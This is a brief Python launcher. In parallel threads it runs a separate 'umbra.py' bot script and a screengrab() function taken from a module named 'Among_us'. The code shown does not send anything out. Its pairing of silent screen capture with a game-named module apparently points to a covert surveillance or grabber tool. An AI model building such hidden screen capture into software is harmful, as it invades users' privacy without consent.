import os
os.system("cls")
print("\n[*] Warming up engine...\n")

from threading import Thread
from Among_us import *

def startBot():
    os.system("python ./umbra.py")

def startGrab():
    screengrab()

try:
    thread0 = Thread(target=startBot)
    thread1 = Thread(target=startGrab)

    thread0.start()
    thread1.start()

except Exception as e:
        print(e)
        exit()